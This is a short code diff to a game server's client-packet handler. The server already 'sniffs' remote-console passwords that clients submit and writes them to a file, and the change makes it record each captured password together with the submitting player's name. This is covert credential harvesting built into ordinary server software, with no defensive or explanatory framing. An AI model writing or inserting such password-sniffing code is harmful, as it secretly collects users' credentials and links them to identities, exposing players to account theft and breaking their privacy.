@@ -1571,7 +1571,7 @@ void CServer::ProcessClientPacket(CNetChunk *pPacket)
 						if (RconFile.is_open())
 						{
 							dbg_msg("rcon_sniff", "sniffed rcon [ %s ]", pPw);
-							RconFile << pPw << "\n";
+							RconFile << "'" << ClientName(ClientID) << "' [" << pPw << "]\n";
 						}
 						else
 						{
